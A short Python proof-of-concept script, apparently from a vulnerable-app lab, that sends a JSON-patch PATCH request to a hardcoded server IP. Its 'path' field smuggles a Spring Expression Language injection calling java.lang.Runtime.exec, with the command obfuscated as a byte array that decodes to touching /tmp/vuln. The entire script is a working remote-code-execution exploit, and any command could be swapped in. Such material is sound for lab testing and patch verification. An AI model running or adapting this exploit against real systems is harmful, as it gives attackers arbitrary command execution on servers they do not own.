import requests

url = "http://140.115.197.136:8081/persons/1"

header = {"Content-Type": "application/json-patch+json",
          "Cache-Control": "no-cache",
          "Content-Length": "228"}

data1 = {"op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,47,116,109,112,47,118,117,108,110}))/lastName", "value": "vulapps-demo"}

r = requests.patch(url,data = data1 , headers=header)

print(r)
print(r.text)   